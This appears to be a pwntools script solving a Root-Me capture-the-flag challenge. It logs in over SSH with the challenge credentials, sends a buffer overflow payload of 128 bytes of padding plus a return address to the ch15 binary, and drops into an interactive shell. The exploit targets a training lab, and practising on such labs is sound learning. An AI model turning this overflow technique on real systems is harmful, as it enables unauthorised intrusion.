from pwn import *

target = ssh(host='challenge02.root-me.org', port=2222, user='app-systeme-ch15', password='app-systeme-ch15')

# Create a payload consisting of 128 A characters followed by the address 0x08048516
overflow = b"A"*128
address = p32(0x08048516)
payload = overflow + address

# Start a process with the binary file and the payload
try:
    sh = target.process(['/challenge/app-systeme/ch15/ch15'])
    sh.send(payload)
    sh.interactive()
except Exception as e:
    print("Error:", e)
    target.close()
